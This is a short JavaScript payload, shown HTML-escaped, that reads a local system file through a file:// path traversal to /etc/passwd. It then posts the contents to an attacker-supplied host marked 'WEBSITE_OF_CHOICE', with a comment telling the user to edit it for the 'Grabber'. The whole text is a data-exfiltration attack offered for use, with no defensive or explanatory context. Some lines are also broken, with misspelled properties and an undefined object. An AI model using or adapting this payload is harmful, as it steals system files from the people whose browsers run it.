&lt;script&gt;
var getdata = null;
get = new XMLHttpRequest();

get.open(&#039;GET&#039;, &quot;file://../../../../../../../../../etc/passwd&quot;);
get.send(&quot;&quot;);
get.onreadystatechange = function() {
    if (get.readyState == 4) {
	getdata = get.responseText;
	POST(getdata);
    }
}

function POST (egg) {
    post = new XMLHttpRequest();
    var strResult;
    //Edit WEBSITE_OF_CHOICE for Grabber
    post.open(&#039;POST&#039;, &quot;WEBSITE_OF_CHOICE&quot;,false);
    post.setRequestHeader(&#039;Conetnt-Type&#039;,&#039;application/x-www-form-urlencoded&#039;);
    post.send(egg);
    get.send(&quot;&quot;);
    post = null;
    strResult = objHTTP.tesponseTetxt;
}
&lt;/script&gt;

